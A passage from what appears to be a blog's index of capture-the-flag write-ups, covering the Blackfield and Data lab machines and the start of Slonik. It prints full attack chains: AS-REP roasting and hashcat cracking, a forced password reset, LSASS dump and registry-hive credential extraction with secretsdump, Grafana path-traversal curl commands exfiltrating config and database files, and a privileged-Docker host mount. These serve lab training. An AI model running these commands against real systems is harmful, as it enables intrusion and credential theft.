BLACKFIELD\\PC04$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1419: BLACKFIELD\\PC05$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1420: BLACKFIELD\\PC06$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1421: BLACKFIELD\\PC07$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1422: BLACKFIELD\\PC08$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1423: BLACKFIELD\\PC09$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1424: BLACKFIELD\\PC10$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1425: BLACKFIELD\\PC11$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1426: BLACKFIELD\\PC12$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1427: BLACKFIELD\\PC13$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1428: BLACKFIELD\\SRV-WEB$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1429: BLACKFIELD\\SRV-FILE$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1430: BLACKFIELD\\SRV-EXCHANGE$ (SidTypeUser)\nSMB         10.10.10.192    445    DC01             1431: BLACKFIELD\\SRV-INTRANET$ (SidTypeUser)\n```\n\n## KERBEROS\n\nFrom there I validated users via kerbrute. All of them seemed to be valid so thats a drag.\n```\n$ kerbrute userenum --dc 10.10.10.192 -d blackfield.local users.list\n\n    __             __               __\n   / /_____  _____/ /_  _______  __/ /____\n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/\n\nVersion: v1.0.3 (9dad6e1) - 02/28/25 - Ronnie Flathers @ropnop\n\n2025/02/28 11:30:45 >  Using KDC(s):\n2025/02/28 11:30:45 >  \t10.10.10.192:88\n\n2025/02/28 11:30:50 >  [+] VALID USERNAME:\t Administrator@blackfield.local\n2025/02/28 11:30:50 >  [+] VALID USERNAME:\t audit2020@blackfield.local\n2025/02/28 11:30:50 >  [+] VALID USERNAME:\t BLACKFIELD189208@blackfield.local\n2025/02/28 11:30:50 >  [+] VALID USERNAME:\t DC01$@blackfield.local\n2025/02/28 11:30:50 >  [+] VALID USERNAME:\t Guest@blackfield.local\n2025/02/28 11:30:50 >  [+] VALID USERNAME:\t support@blackfield.local\n<SNIP>\n2025/02/28 11:33:27 >  [+] VALID USERNAME:\t svc_backup@blackfield.local\n2025/02/28 11:33:27 >  [+] VALID USERNAME:\t BLACKFIELD438814@blackfield.local\n2025/02/28 11:33:27 >  [+] VALID USERNAME:\t BLACKFIELD653097@blackfield.local\n2025/02/28 11:33:32 >  [+] VALID USERNAME:\t PC10$@blackfield.local\n2025/02/28 11:33:32 >  [+] VALID USERNAME:\t PC07$@blackfield.local\n2025/02/28 11:33:32 >  [+] VALID USERNAME:\t SRV-WEB$@blackfield.local\n2025/02/28 11:33:32 >  [+] VALID USERNAME:\t PC09$@blackfield.local\n2025/02/28 11:33:32 >  [+] VALID USERNAME:\t PC13$@blackfield.local\n2025/02/28 11:33:32 >  [+] VALID USERNAME:\t PC11$@blackfield.local\n2025/02/28 11:33:32 >  [+] VALID USERNAME:\t PC05$@blackfield.local\n2025/02/28 11:33:32 >  [+] VALID USERNAME:\t PC06$@blackfield.local\n2025/02/28 11:33:32 >  [+] VALID USERNAME:\t PC08$@blackfield.local\n2025/02/28 11:33:32 >  [+] VALID USERNAME:\t PC12$@blackfield.local\n2025/02/28 11:33:38 >  [+] VALID USERNAME:\t SRV-EXCHANGE$@blackfield.local\n2025/02/28 11:33:38 >  [+] VALID USERNAME:\t SRV-FILE$@blackfield.local\n2025/02/28 11:33:38 >  [+] VALID USERNAME:\t SRV-INTRANET$@blackfield.local\n2025/02/28 11:33:38 >  Done! Tested 333 usernames (332 valid) in 172.662 seconds\n```\nNever the less, I wanted to see if anyone has PRE-AUTH DISABLED. We got one user `support`.\n```\n$ GetNPUsers.py -dc-ip 10.10.10.192 -dc-host blackfield.local -usersfile users.list -no-pass 'blackfield.local/'\n\n[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set\n$krb5asrep$23$support@BLACKFIELD.LOCAL:a0fc2d3cd96d551c43ed7ddfcf9f0efa$9861e8be198b1bbf19120a2f99a8<SNIP>\n[-] User BLACKFIELD764430 doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User BLACKFIELD538365 doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User BLACKFIELD189208 doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User BLACKFIELD404458 doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User BLACKFIELD706381 doesn't have UF_DONT_REQUIRE_PREAUTH set\n<SNIP>\n```\n![GREAT SUCCESS](/img/great.gif)\nCracking this with hashcat gives us a clear text password.\n```\n$ hashcat support.hash /usr/share/wordlists/rockyou.txt --show\nHash-mode was not specified with -m. Attempting to auto-detect hash mode.\nThe following mode was auto-detected as the only one matching your input hash:\n\n18200 | Kerberos 5, etype 23, AS-REP | Network Protocol\n\nNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!\nDo NOT report auto-detect issues unless you are certain of the hash type.\n\n$krb5asrep$23$support@BLACKFIELD.LOCAL:a0fc2d3cd96d551c43ed7ddfcf9f0efa$9861e8be198b1bbf19120a2f99a8d05d7363d86f881bc81256c8271b7f1985c<SNIP>4ea9c8feea6ec223314fc227ee3c240d7f03998089456763f2cdb4aace7a32d41f6f9b9b11d2553afdb985948a6f58e2366b804:<SNIP>\n```\n\n## BloodHound\n\nNow we have some credentials to get a bloodhound dump.\n```\n$ nxc ldap 10.10.10.192 -u support -p '<SNIP>' --dns-server 10.10.10.192 --bloodhound -c All\nSMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)\nLDAP        10.10.10.192    389    DC01             [+] BLACKFIELD.local\\support:<SNIP>\nLDAP        10.10.10.192    389    DC01             Resolved collection methods: rdp, acl, container, session, trusts, psremote, dcom, objectprops, localadmin, group\nLDAP        10.10.10.192    389    DC01             Done in 00M 08S\nLDAP        10.10.10.192    389    DC01             Compressing output into /home/jaybit/.nxc/logs/DC01_10.10.10.192_2025-02-28_114320_bloodhound.zip\n```\nLooking at our pwnd user `support`, we see we have `ForceChangePassword` over `audit2020`. So using `bloodyAD`(MyFaV), we change his password.\n```\n$ ./bloodyAD.py -v DEBUG -u 'support' -p '<SNIP>' --host 10.10.10.192 -d blackfield.local set password audit2020 Password123\n[*] Trying to connect to 10.10.10.192...\n[+] Connection successful\n[+] Password changed successfully!\n```\nNow back to `SMB` and see what he has access to.\n\n## SMB Round 2\n\nRunning NetExec shows we have `READ` to the forencis share.\n```\n$ nxc smb blackfield.local -u audit2020 -p Password123 --shares\nSMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\\audit2020:Password123\nSMB         10.10.10.192    445    DC01             [*] Enumerated shares\nSMB         10.10.10.192    445    DC01             Share           Permissions     Remark\nSMB         10.10.10.192    445    DC01             -----           -----------     ------\nSMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin\nSMB         10.10.10.192    445    DC01             C$                              Default share\nSMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.\nSMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC\nSMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share\nSMB         10.10.10.192    445    DC01             profiles$       READ\nSMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share\n```\nLooking into this share with `impacket-smbclient` showed us a couple to choose from.\n```\n$ impacket-smbclient -dc-ip 10.10.10.192 'blackfield.local/audit2020:Password123@blackfield.local'\nImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies\n\nType help for list of commands\n# use forensic\n# ls\ndrw-rw-rw-          0  Sun Feb 23 09:10:16 2020 .\ndrw-rw-rw-          0  Sun Feb 23 09:10:16 2020 ..\ndrw-rw-rw-          0  Sun Feb 23 12:14:37 2020 commands_output\ndrw-rw-rw-          0  Thu May 28 15:29:24 2020 memory_analysis\ndrw-rw-rw-          0  Fri Feb 28 16:30:34 2020 tools\n```\nThis looks like a dump of some sort from the DC based on the tools and commands_output directory.\n\nTools Directory:\n```\n# ls\ndrw-rw-rw-          0  Fri Feb 28 16:30:34 2020 .\ndrw-rw-rw-          0  Fri Feb 28 16:30:34 2020 ..\ndrw-rw-rw-          0  Fri Feb 28 16:30:34 2020 sleuthkit-4.8.0-win32\ndrw-rw-rw-          0  Fri Feb 28 16:30:35 2020 sysinternals\ndrw-rw-rw-          0  Fri Feb 28 16:30:35 2020 volatility\n```\nCommands_output Directory:\n```\n# ls\ndrw-rw-rw-          0  Sun Feb 23 12:14:37 2020 .\ndrw-rw-rw-          0  Sun Feb 23 12:14:37 2020 ..\n-rw-rw-rw-        528  Sun Feb 23 12:12:54 2020 domain_admins.txt\n-rw-rw-rw-        962  Sun Feb 23 12:12:54 2020 domain_groups.txt\n-rw-rw-rw-      16454  Fri Feb 28 16:32:17 2020 domain_users.txt\n-rw-rw-rw-     518202  Sun Feb 23 12:12:54 2020 firewall_rules.txt\n-rw-rw-rw-       1782  Sun Feb 23 12:12:54 2020 ipconfig.txt\n-rw-rw-rw-       3842  Sun Feb 23 12:12:54 2020 netstat.txt\n-rw-rw-rw-       3976  Sun Feb 23 12:12:54 2020 route.txt\n-rw-rw-rw-       4550  Sun Feb 23 12:12:54 2020 systeminfo.txt\n-rw-rw-rw-       9990  Sun Feb 23 12:12:54 2020 tasklist.txt\n```\nMemory_analysis Directory:\n```\n     3842  Sun Feb 23 12:12:54 2020 netstat.txt\n-rw-rw-rw-       3976  Sun Feb 23 12:12:54 2020 route.txt\n-rw-rw-rw-       4550  Sun Feb 23 12:12:54 2020 systeminfo.txt\n-rw-rw-rw-       9990  Sun Feb 23 12:12:54 2020 tasklist.txt\n# cd ../memory_analysis\n# ls\ndrw-rw-rw-          0  Thu May 28 15:29:24 2020 .\ndrw-rw-rw-          0  Thu May 28 15:29:24 2020 ..\n-rw-rw-rw-   37876530  Thu May 28 15:29:24 2020 conhost.zip\n-rw-rw-rw-   24962333  Thu May 28 15:29:24 2020 ctfmon.zip\n-rw-rw-rw-   23993305  Thu May 28 15:29:24 2020 dfsrs.zip\n-rw-rw-rw-   18366396  Thu May 28 15:29:24 2020 dllhost.zip\n-rw-rw-rw-    8810157  Thu May 28 15:29:24 2020 ismserv.zip\n-rw-rw-rw-   41936098  Thu May 28 15:29:24 2020 lsass.zip\n-rw-rw-rw-   64288607  Thu May 28 15:29:24 2020 mmc.zip\n-rw-rw-rw-   13332174  Thu May 28 15:29:24 2020 RuntimeBroker.zip\n-rw-rw-rw-  131983313  Thu May 28 15:29:24 2020 ServerManager.zip\n-rw-rw-rw-   33141744  Thu May 28 15:29:24 2020 sihost.zip\n-rw-rw-rw-   33756344  Thu May 28 15:29:24 2020 smartscreen.zip\n-rw-rw-rw-   14408833  Thu May 28 15:29:24 2020 svchost.zip\n-rw-rw-rw-   34631412  Thu May 28 15:29:24 2020 taskhostw.zip\n-rw-rw-rw-   14255089  Thu May 28 15:29:24 2020 winlogon.zip\n-rw-rw-rw-    4067425  Thu May 28 15:29:24 2020 wlms.zip\n-rw-rw-rw-   18303252  Thu May 28 15:29:24 2020 WmiPrvSE.zip\n```\nThe `lsass.zip` caught my eye so I downloaded that to my machine and unziped it.\n```\n$ unzip lsass.zip\nArchive:  lsass.zip\n  inflating: lsass.DMP\n$ file lsass.DMP\nlsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 type\n```\nSo we have a dump. We can use a python3 module `pypykatz` to dump this. This dumps everything including `svc_backup`'s hash.\n```\n$ python3 -m pypykatz lsa minidump lsass.DMP\nINFO:pypykatz:Parsing file lsass.DMP\nFILE: ======== lsass.DMP =======\n== LogonSession ==\nauthentication_id 406458 (633ba)\nsession_id 2\nusername svc_backup\ndomainname BLACKFIELD\nlogon_server DC01\nlogon_time 2020-02-23T18:00:03.423728+00:00\nsid S-1-5-21-4194615774-2175524697-3563712290-1413\nluid 406458\n\t== MSV ==\n\t\tUsername: svc_backup\n\t\tDomain: BLACKFIELD\n\t\tLM: NA\n\t\tNT: <SNIP>\n\t\tSHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c\n\t\tDPAPI: a03cd8e9d30171f3cfe8caad92fef621\n<SNIP>\n```\n\n## Shell as svc_backup\n\nGetting on the box and seeing what privileges we have.\n```\n*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> whoami /all\n<SNIP>\nGROUP INFORMATION\n-----------------\n\nGroup Name                                 Type             SID          Attributes\n========================================== ================ ============ ==================================================\nEveryone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group\n<SNIP>\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeBackupPrivilege             Back up files and directories  Enabled\nSeRestorePrivilege            Restore files and directories  Enabled\nSeShutdownPrivilege           Shut down the system           Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n<SNIP>\n```\nSo where part of `BackupOperators`. Shouldn't be too hard. Lets backup the SAM,SYSTEM,and SECURITY.\n```\n*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> reg.exe save hklm\\sam SAM.save\nThe operation completed successfully.\n\n*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> reg.exe save hklm\\system SYSTEM.save\nThe operation completed successfully.\n\n*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> reg.exe save hklm\\security SECURITY.save\nreg.exe : ERROR: Access is denied.\n    + CategoryInfo          : NotSpecified: (ERROR: Access is denied.:String) [], RemoteException\n    + FullyQualifiedErrorId : NativeCommandError\n```\nHmmm....can't backup the `SECURITY` locally, lets try remotely.\n```\n$ reg.py 'blackfield.local'/'svc_backup'@'10.10.10.192' -hashes :<SNIP> save -keyName 'HKLM\\SECURITY' -o 'C:\\Users\\svc_backup\\Documents\\'\nImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies\n\n[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...\n[*] Saved HKLM\\SECURITY to C:\\Users\\svc_backup\\Documents\\\\SECURITY.save\n```\nNow we can download them on to our machine and dump the secrets.\n```\n*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> ls\n\n\n    Directory: C:\\Users\\svc_backup\\Documents\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----        2/28/2025   3:54 PM          45056 SAM.save\n-a----        2/28/2025   6:02 PM          32768 SECURITY.save\n-a----        2/28/2025   3:54 PM       17371136 SYSTEM.save\n```\n\n![All the SECRETS!!!](/img/toomanysecrets.gif)\n```\n$ secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL\nImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n<SNIP>\n[*] Cleaning up...\n```\n## Shell as Administrator\n\nFinally, we are administrator on the machine.\n```\n$ evil-winrm -i blackfield.local -u Administrator -p <SNIP>\n\nEvil-WinRM shell v3.5\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami;hostname\nblackfield\\administrator\nDC01\n```\n![](/img/robocop.gif)","tags":["SMB","ASREPRoasting","Hashcat","pypykatz","BackupOperators"],"categories":["htb"]},{"title":"Data (Linux Easy)","url":"/2024/12/21/Data/","content":"![](/img/data.jpg)\n\nData starts out with Grafana being ran on port 3000. We are able to use Unauthorized Arbitrary File Read Vulnerability (CVE-2021-43798) and exfil `grafana.ini` and `grafana.db`. Having these we can use a python script to convert this data and hashes to sha256 for hashcat. This gets us on the box as boris. Looking at his privileges we can execute `docker exec`. To get root privileges on the docker container we can run `sudo /snap/bin/docker exec --privileged -u 0 -it grafana /bin/bash`. From here we can see the filesystem `df -h` and since we're root we can `mkdir /tmp/pwnd` and `mount /dev/xXxXx /mnt/pwnd`. This lets us read, write, and execute on host filesystem outside the container.\n\n## Initial Nmap\n```\nPORT     STATE SERVICE REASON         VERSION                                                 \n22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n3000/tcp open  ppp?    syn-ack ttl 62      \n```\n\n## HTTP (Port 3000 - Grafana)\n\nGoing to this shows a login page with a version number at the bottom we can use.\n\nResearching gave us [CVE-2021-43798](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798), where we can include files using Directory Traversal. So we can exfil the `grafana.ini` and the `grafana.db`\n\n```\n$ curl --path-as-is http://10.10.89.74:3000/public/plugins/mysql/../../../../../../../../../../etc/grafana/grafana.ini -o grafana.ini\n$ curl --path-as-is http://data.vl:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db\n```\n\nLooking in the `db` file we see hashes for admin and boris. We note the password, and the salt. We can use a python script to generate sha256 hashes for use so we can crack them with hashcat.\n\n`grafana.db`\n```\nCREATE TABLE `user` (                                                                          \n`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL                                                \n, `version` INTEGER NOT NULL                                                                   \n, `login` TEXT NOT NULL                                                                                                                                                                       \n, `email` TEXT NOT NULL                                                                        \n, `name` TEXT NULL                                                                                                                                                                            \n, `password` TEXT NULL                                                                         \n, `salt` TEXT NULL                                                                             \n, `rands` TEXT NULL                                                                                                                                                                           \n, `company` TEXT NULL                                                                                                                                                                         \n, `org_id` INTEGER NOT NULL                                                                                                                                                                   \n, `is_admin` INTEGER NOT NULL                                                                                                                                                                 \n, `email_verified` INTEGER NULL                                                                                                                                                               \n, `theme` TEXT NULL                                                                                                                                                                           \n, `created` DATETIME NOT NULL                                                                                                                                                                 \n, `updated` DATETIME NOT NULL                                                                                                                                                                 \n, `help_flags1` INTEGER NOT NULL DEFAULT 0, `last_seen_at` DATETIME NULL, `is_disabled` INTEGER NOT NULL DEFAULT 0);                                                                          \nINSERT INTO user VALUES(1,0,'admin','admin@localhost','','7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8','YObSoLj55S','hLLY6QQ4Y6','',1\n,1,0,'','2022-01-23 12:48:04','2022-01-23 12:48:50',0,'2022-01-23 12:48:50',0);                                                                                                               \nINSERT INTO user VALUES(2,0,'boris','boris@data.vl','boris','<SNIP>f4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8','<SNIP>','mYl941ma8w','\n',1,0,0,'','2022-01-23 12:49:11','2022-01-23 12:49:11',0,'2012-01-23 12:49:11',0);\n```\n\n`decryptor.py`\n```\nimport hashlib\nimport base64\n\ndef calculate_hash(password, salt):\n    decoded_hash = bytes.fromhex(password)\n    salt_base64 = base64.b64encode(salt.encode('utf-8')).decode('utf-8')\n    hash_base64 = base64.b64encode(decoded_hash).decode('utf-8')\n    return f'sha256:10000:{salt_base64}:{hash_base64}'\n\n# boris\nboris_password = \"<SNIP>34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8\"\nboris_salt = \"<SNIP>\"\nboris_hash = calculate_hash(boris_password, boris_salt)\n\n# admin\nadmin_password = \"<SNIP>5cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8\"\nadmin_salt = \"<SNIP>\"\nadmin_hash = calculate_hash(admin_password, admin_salt)\n\nprint(f\"[+] Boris hash: {boris_hash}\")\nprint(f\"[+] Admin hash: {admin_hash}\")\n\nwith open(\"hashes.txt\", \"w\") as file:\n    file.write(boris_hash + \"\\n\")\n    file.write(admin_hash + \"\\n\")\n```\n\nRunning this script gave us hashes we can run through hashcat. \n\n```\n[+] Boris hash: sha256:10000:<REDACTED>:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=\n[+] Admin hash: sha256:10000:<REDACTED>:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=\n```\nHashcat reveals a cleartext password for boris.\n\n```\nhashcat (v6.2.6) starting in autodetect mode                                                                                                                                                                                                                                         \nHash-mode was not specified with -m. Attempting to auto-detect hash mode.\nThe following mode was auto-detected as the only one matching your input hash:\n\n10900 | PBKDF2-HMAC-SHA256 | Generic KDF                   \n\nDictionary cache hit:            \n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\nsha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:<REDATED>\n```\n![](/img/great.gif)\n\nWe can login to the site, but we can also ssh in as boris.\n\n## Shell as boris\n```\n$ ssh boris@data.vl  \nboris@data.vl's password: \nWelcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1060-aws x86_64)\n\nLast login: Sun Jan 23 13:11:53 2022 from 10.10.1.254\nboris@ip-10-10-10-11:~$\n```\nDoing some manual enumeration we find docker running, we can confirm by looking for a socket(usually /run/docker.sock). We also can see if we can read/write to it.\n```\nboris@ip-10-10-10-11:~$ df -h\nFilesystem      Size  Used Avail Use% Mounted on\nudev            476M     0  476M   0% /dev\ntmpfs            98M  876K   98M   1% /run\n/dev/xvda1      7.7G  1.6G  6.2G  20% /\ntmpfs           490M     0  490M   0% /dev/shm\ntmpfs           5.0M     0  5.0M   0% /run/lock\ntmpfs           490M     0  490M   0% /sys/fs/cgroup\n/dev/loop0       25M   25M     0 100% /snap/amazon-ssm-agent/4046\n/dev/loop1       56M   56M     0 100% /snap/core18/2253\n/dev/loop2       43M   43M     0 100% /snap/snapd/14066\n/dev/loop3      117M  117M     0 100% /snap/docker/1125\ntmpfs            98M     0   98M   0% /run/user/1001\nboris@ip-10-10-10-11:~$ find / -iname docker.sock 2>/dev/null\n/run/docker.sock\nboris@ip-10-10-10-11:~$ ls -lsa /run/docker.sock\n0 srw-rw---- 1 root root 0 Dec 22 15:31 /run/docker.sock\nboris@ip-10-10-10-11:~$ \n```\nWe can look at his permissions and see we can use docker as well with root privileges.\n```\nboris@ip-10-10-10-11:~$ sudo -l\nMatching Defaults entries for boris on ip-10-10-10-11:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser boris may run the following commands on ip-10-10-10-11:\n    (root) NOPASSWD: /snap/bin/docker exec *\n```\n\n## Docker PrivEsc\n\nWe can use docker to escalate our privilege. We know the docker container running is `grafana`. We can use the `--privileged` flag to create a misconfig that will allow us to access the host filesystem. Also setting our `-u` to 0 (root user).\n```\nboris@ip-10-10-10-11:~$ sudo /snap/bin/docker exec --privileged -u 0 -it grafana /bin/bash\nbash-5.1# id\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\nbash-5.1# \n```\nLooking at the filesystem once again. We have `xvda1` we can mount to, this being to the filesystem the docker container is using.\n```\nbash-5.1# df -h\nFilesystem                Size      Used Available Use% Mounted on\noverlay                   7.7G      1.5G      6.2G  20% /\ntmpfs                    64.0M         0     64.0M   0% /dev\ntmpfs                   489.3M         0    489.3M   0% /sys/fs/cgroup\nshm                      64.0M         0     64.0M   0% /dev/shm\n/dev/xvda1                7.7G      1.5G      6.2G  20% /etc/resolv.conf\n/dev/xvda1                7.7G      1.5G      6.2G  20% /etc/hostname\n/dev/xvda1                7.7G      1.5G      6.2G  20% /etc/hosts \n```\nLet's create a folder and mount it.\n```\nbash-5.1# mkdir /tmp/pwnd\nbash-5.1# mount /dev/xvda1 /tmp/pwnd\nbash-5.1# ls -alis /tmp/pwnd/\ntotal 104\n      2      4 drwxr-xr-x   23 root     root          4096 Dec 22 15:31 .\n 258310      4 drwxrwxrwt    1 root     root          4096 Dec 22 17:17 ..\n     12      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 bin\n    180      4 drwxr-xr-x    3 root     root          4096 Nov 29  2021 boot\n    192      4 drwxr-xr-x    4 root     root          4096 Nov 29  2021 dev\n    206      4 drwxr-xr-x   91 root     root          4096 Dec 22 15:31 etc\n   1637      4 drwxr-xr-x    4 root     root          4096 Jan 23  2022 home\n  55945      0 lrwxrwxrwx    1 root     root            30 Nov 29  2021 initrd.img -> boot/initrd.img-5.4.0-1060-aws\n  55943      0 lrwxrwxrwx    1 root     root            30 Nov 29  2021 initrd.img.old -> boot/initrd.img-5.4.0-1060-aws\n   1640      4 drwxr-xr-x   20 root     root          4096 Nov 29  2021 lib\n   3837      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 lib64\n     11     16 drwx------    2 root     root         16384 Nov 29  2021 lost+found\n   3839      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 media\n   3840      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 mnt\n   3841      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 opt\n   3842      4 drwxr-xr-x    2 root     root          4096 Apr 24  2018 proc\n   3843      4 drwx------    5 root     root          4096 Jan 23  2022 root\n   3846      4 drwxr-xr-x    5 root     root          4096 Nov 29  2021 run\n   3849      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 sbin\n   4069      4 drwxr-xr-x    7 root     root          4096 Jan 23  2022 snap\n   4070      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 srv\n   4071      4 drwxr-xr-x    2 root     root          4096 Apr 24  2018 sys\n   4072      4 drwxrwxrwt   11 root     root          4096 Dec 22 16:49 tmp\n   4073      4 drwxr-xr-x   11 root     root          4096 Nov 29  2021 usr\n  60780      4 drwxr-xr-x   13 root     root          4096 Nov 29  2021 var\n  55944      0 lrwxrwxrwx    1 root     root            27 Nov 29  2021 vmlinuz -> boot/vmlinuz-5.4.0-1060-aws\n  49497      0 lrwxrwxrwx    1 root     root            27 Nov 29  2021 vmlinuz.old -> boot/vmlinuz-5.4.0-1060-aws\nbash-5.1# ls -alis /tmp/pwnd/root/\ntotal 28\n   3843      4 drwx------    5 root     root          4096 Jan 23  2022 .\n      2      4 drwxr-xr-x   23 root     root          4096 Dec 22 15:31 ..\n    181      0 lrwxrwxrwx    1 root     root             9 Jan 23  2022 .bash_history -> /dev/null\n 256239      4 drwxr-xr-x    3 root     root          4096 Jan 23  2022 .local\n   3844      4 -rw-r--r--    1 root     root           148 Aug 17  2015 .profile\n 256089      4 drwx------    2 root     root          4096 Jan 23  2022 .ssh\n  56047      4 -rw-r--r--    1 root     root            37 Jan 23  2022 root.txt\n 256188      4 drwxr-xr-x    4 root     root          4096 Jan 23  2022 snap\nbash-5.1# \n```\n![](/img/robocop.gif)\n\n\n","tags":["Grafana","Docker Privileged Containers"],"categories":["vl"]},{"title":"Slonik (Linux Medium)","url":"/2024/12/04/Slonik/","content":"![](/img/slonik.jpg)\n\nSlonik is a linux box created around reusing a socket and the ability to port forward them. It starts with a box running NFS, and using `showmount` our able to see two. There is `/var/backups`, and `/home`. Home was interesting, with there being a `.bash_history` and a `.psql_history` to see that we have commands previously ran. Using `rpcinfo` you can see we have sockets being used. From the information we have we can create a directory `/tmp/sock` and us it and the ending pid in the `.bash_history`. Using ssh we can connect using the socket created by postgres. Once connected we can get a reverse shell using a POC from [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce). Once getting a shell, we run pspy64 to see a script running from cron `/usr/bin/backup`. This script will back up everything `postgres` HOME directory. By copying `/usr/bin/bash` to our HOME directory in `main`. Then giving it the sticky bit and making it executable we can get root.\n\n## Initial Nmap\n```\nPORT     STATE SERVICE REASON\n22/tcp   open  ssh     syn-ack ttl 63\n111/tcp  open  rpcbind syn-ack ttl 63\n2049/tcp open  nfs     syn-ack ttl 63\n```\n## NFS\n\nShowing the mounts available on the 